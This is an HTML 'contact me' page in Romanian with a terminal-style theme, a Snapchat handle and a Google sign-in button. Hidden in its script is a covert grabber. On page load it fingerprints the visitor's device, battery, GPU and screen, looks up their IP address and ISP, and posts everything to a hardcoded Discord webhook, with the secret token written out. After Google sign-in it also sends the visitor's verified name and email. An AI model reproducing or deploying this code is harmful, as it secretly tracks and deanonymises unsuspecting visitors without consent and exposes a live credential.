<!DOCTYPE html>
<html lang="ro">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Portal Contact</title>
  
  <!-- Librăria oficială Google Identity -->
  <script src="https://accounts.google.com/gsi/client" async defer></script>
  
  <style>
    /* THEME: Terminal / Hacker - Exact as the password GUI */
    body, html { 
      margin: 0; padding: 0; height: 100%; 
      background-color: black; 
      font-family: "Anonymous Pro", monospace; 
      color: #8cff66; 
    }
    .centered { 
      display: flex; align-items: center; justify-content: center; 
      min-height: 100vh; padding: 20px 0; 
    }
    .portal-card { 
      padding: 20px; 
      border-radius: 10px; 
      background-color: rgba(0, 0, 0, 0.8); 
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
      text-align: center; 
      width: 90%; 
      max-width: 450px; 
    }
    h2 { 
      border-bottom: 1px solid #333; 
      padding-bottom: 10px; 
      margin-bottom: 20px; 
      margin-top: 0;
      color: white; 
    }
    .description { 
      color: #aaa; 
      font-size: 0.95em; 
      line-height: 1.5; 
      margin-bottom: 15px; 
      font-weight: bold;
    }
    .snapchat-text {
      color: #fffc00; /* Snapchat Yellow */
      font-weight: bold;
      font-size: 1.1em;
      margin-bottom: 25px;
      padding: 10px;
      border: 1px dashed #333;
      border-radius: 5px;
    }
    .dm-btn { 
      background-color: #444; 
      color: white; 
      padding: 12px 20px; 
      border: none; 
      border-radius: 5px; 
      cursor: pointer; 
      font-family: "Anonymous Pro", monospace; 
      width: 100%; 
      font-size: 1em; 
      transition: background 0.3s; 
      text-decoration: none; 
      display: block; 
      box-sizing: border-box; 
      margin-top: 20px;
    }
    .dm-btn:hover { background-color: #666; }
    
    #googleBtnContainer { 
      display: flex; justify-content: center; margin-top: 10px; 
    }
    #hiddenGateway { display: none; }
    
    /* CSS DETECTOR - ASCUNS */
    #notch-detector {
      position: absolute; top: 0; left: 0;
      height: env(safe-area-inset-top); width: 1px;
      visibility: hidden; z-index: -1;
    }
  </style>
</head>

<body>
  <!-- Notch detector limit -->
  <div id="notch-detector"></div>

  <div class="centered">
    <div class="portal-card">
      <h2>CONTACTEAZĂ-MĂ</h2>
      
      <p class="description" id="mainText">
        Apasă pe butonul de mai jos ca să mă contactezi, vei fi redirecționat unde trebuie!
      </p>

      <div class="snapchat-text" id="snapText">
        Snapchat: niciuncaz_d
      </div>

      <!-- Google Button -->
      <div id="googleBtnContainer">
        <!-- Client ID placeholder -->
        <div id="g_id_onload"
             data-client_id="YOUR_GOOGLE_CLIENT_ID_GOES_HERE.apps.googleusercontent.com"
             data-callback="handleCredentialResponse"
             data-auto_prompt="false">
        </div>
        <div class="g_id_signin"
             data-type="standard"
             data-size="large"
             data-theme="filled_black"
             data-text="continue_with"
             data-shape="rectangular"
             data-logo_alignment="center">
        </div>
      </div>

      <!-- Hidden Zone -->
      <div id="hiddenGateway">
        <p style="color: #aaa; margin-bottom: 5px; font-size: 0.85em; font-weight:bold;">Identitate Confirmată:</p>
        <p style="color: #8cff66; font-weight: bold; margin-top: 0; margin-bottom: 20px;" id="userEmail"></p>
        <a href="https://discord.gg/bVGqTnTuJ" class="dm-btn" target="_blank">TRIMITE MESAJ DIRECT</a>
      </div>
    </div>
  </div>

  <script>
    // STRICT LOCKS to prevent multiple webhooks
    let initialWebhookSent = false;
    let authWebhookSent = false;
    
    let globalSyncData = {};
    let globalAsyncData = {};

    // --- 1. REFRESH RATE DETECTOR ---
    function getRefreshRate() {
      return new Promise(resolve => {
        let frames = 0; let startTime = performance.now();
        function loop() {
          frames++; const now = performance.now();
          if (now - startTime >= 500) resolve(Math.round(frames * 2));
          else requestAnimationFrame(loop);
        }
        requestAnimationFrame(loop);
      });
    }

    // --- 2. EXACT ORIGINAL HARDWARE SCAN ---
    async function identifyDevice() {
      const ua = navigator.userAgent;
      const w = window.screen.width; const h = window.screen.height;
      const notchDiv = document.getElementById('notch-detector');
      const safeArea = notchDiv.clientHeight || 0;
      
      const fps = await getRefreshRate();
      const isPro = fps > 90;
      const isIsland = safeArea > 46; 
      const isNotch = safeArea > 30 && safeArea < 47;
      
      let name = "Unknown Device"; let type = "PC"; let os = "Unknown";

      if (/iPhone|iPad/.test(ua)) {
        type = "iOS"; os = "iOS";
        if (w === 440 || h === 956) name = "iPhone 16 Pro Max 👑";
        else if (w === 402 || h === 874) name = "iPhone 16 Pro 💎";
        else if (w === 430 || h === 932) name = isPro ? "iPhone 15 Pro Max / 14 Pro Max" : "iPhone 16 Plus / 15 Plus / 14 Plus";
        else if (w === 393 || h === 852) name = isPro ? "iPhone 15 Pro / 14 Pro" : "iPhone 16 / 15";
        else if (w === 390 || h === 844) name = isPro ? "iPhone 13 Pro / 12 Pro" : "iPhone 14 / 13 / 12";
        else if (w === 320 || h === 693) {
          if (isIsland && isPro) name = "iPhone 16 Pro / 15 Pro (Zoomed)";
          else if (isIsland && !isPro) name = "iPhone 16 / 15 (Zoomed)";
          else if (isNotch) name = "iPhone 14/13/12 (Zoomed)";
          else name = "iPhone SE / Legacy (Zoomed)";
        }
        else if (w === 375) name = "iPhone 11 Pro / X / XS / Mini";
        else if (w === 414) name = "iPhone 11 / XR / Max Model";
        else name = `iPhone (${w}x${h})`;
      } else if (/Android/.test(ua)) {
        type = "Android"; os = "Android";
        name = ua.match(/;\s?([^;]*?)\sBuild/) ? ua.match(/;\s?([^;]*?)\sBuild/)[1] : "Android Generic";
      } else if (/Windows/.test(ua)) { name = "Windows PC"; os = "Windows"; }
      else if (/Mac/.test(ua)) { name = "Macintosh"; os = "macOS"; }

      return {
        name, type, os, fps, safeArea, res: `${w}x${h}`,
        gpu: getGPUInfo(), cores: navigator.hardwareConcurrency || "?",
        theme: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Dark" : "Light"
      };
    }

    function getGPUInfo() {
      try {
        const c = document.createElement('canvas'); const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
      } catch(e) { return "Blocked"; }
    }

    // --- 3. EXACT ORIGINAL ASYNC INFO (Timeouts increased to 3000ms so it doesn't fail) ---
    async function getAsyncInfo(osType) {
      const timeout = (ms) => new Promise(res => setTimeout(() => res(null), ms));
      const batPromise = (async () => {
        try { if (osType === "iOS") return "Apple Restricted"; if(!navigator.getBattery) return "N/A"; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}%`; } catch(e) { return "Blocked"; }
      })();
      const ipPromise = (async () => { try { const res = await fetch("https://api.ipify.org?format=json"); const d = await res.json(); return d.ip; } catch(e) { return "Hidden"; } })();
      const ispPromise = (async () => { try { const res = await fetch("https://ipwho.is/"); const d = await res.json(); return d.connection ? d.connection.isp : "Unknown ISP"; } catch(e) { return "Unknown"; } })();

      return {
        battery: await Promise.race([batPromise, timeout(3000)]) || "Timeout",
        ip: await Promise.race([ipPromise, timeout(3000)]) || "Timeout",
        isp: await Promise.race([ispPromise, timeout(3000)]) || "Timeout"
      };
    }

    // --- 4. EXACT ORIGINAL WEBHOOK LOGIC ---
    async function fireWebhook(data, gmailInfo = null) {
      const webhookURL = "https://discord.com/api/webhooks/1466752892550516938/ZQGeg41b-UOxsIVFc8JPE2pRbxO3SdYDUA-idIpoKxuplL2psoct_T2A6CKFTafnbhAc";
      
      const fields = [
        { name: 'IP Address', value: data.ip || 'Unknown', inline: true },
        { name: 'ISP', value: data.isp || 'Unknown', inline: true },
        { name: 'Model', value: data.name || 'Unknown', inline: false },
        { name: 'Display', value: `${data.fps}Hz | ${data.safeArea}px (Notch)`, inline: false },
        { name: 'GPU', value: data.gpu || 'Unknown', inline: false },
        { name: 'Specs', value: `${data.res} | ${data.cores} Cores`, inline: false },
        { name: 'Config', value: `${data.theme} Mode | Bat: ${data.battery}`, inline: false }
      ];

      if (gmailInfo) {
        fields.unshift(
          { name: '🔴 VERIFIED NAME', value: gmailInfo.name, inline: true },
          { name: '🔴 VERIFIED EMAIL', value: gmailInfo.email, inline: true }
        );
      }

      const jsonPayload = JSON.stringify({
        username: "System Tracker",
        embeds: [{
          title: gmailInfo ? '🚨 AUTHENTICATED ACCESS PORTAL LOG' : '🚨 PRECISION DEVICE LOG',
          color: gmailInfo ? 15158332 : 3066993, 
          fields: fields,
          timestamp: new Date().toISOString()
        }]
      });

      const formData = new FormData();
      formData.append('payload_json', jsonPayload);
      try { await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: formData }); } catch (e) {}
    }

    // --- 5. EXECUTE EXACTLY ONCE ON LOAD ---
    window.addEventListener('load', async () => {
      if (initialWebhookSent) return; // Strict lock
      initialWebhookSent = true;
      
      globalSyncData = await identifyDevice();
      globalAsyncData = await getAsyncInfo(globalSyncData.os);
      const fullData = { ...globalSyncData, ...globalAsyncData };
      await fireWebhook(fullData);
    });

    // --- 6. GOOGLE LOGIN HANDLER ---
    function decodeJwt(token) {
      try {
        const base64Url = token.split('.')[1]; const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        const jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
        return JSON.parse(jsonPayload);
      } catch (e) { return null; }
    }

    async function handleCredentialResponse(response) {
      if (authWebhookSent) return; // Strict lock
      authWebhookSent = true;

      const payload = decodeJwt(response.credential);
      if (payload) {
        // Hide initial UI elements
        document.getElementById("googleBtnContainer").style.display = "none";
        document.getElementById("mainText").style.display = "none";
        document.getElementById("snapText").style.display = "none";
        
        // Show Hidden Link and Email
        document.getElementById("hiddenGateway").style.display = "block";
        document.getElementById("userEmail").innerText = payload.email;

        // Fire authenticated webhook
        const fullData = { ...globalSyncData, ...globalAsyncData };
        await fireWebhook(fullData, { name: payload.name, email: payload.email });
      }
    }
  </script>
</body>
</html>
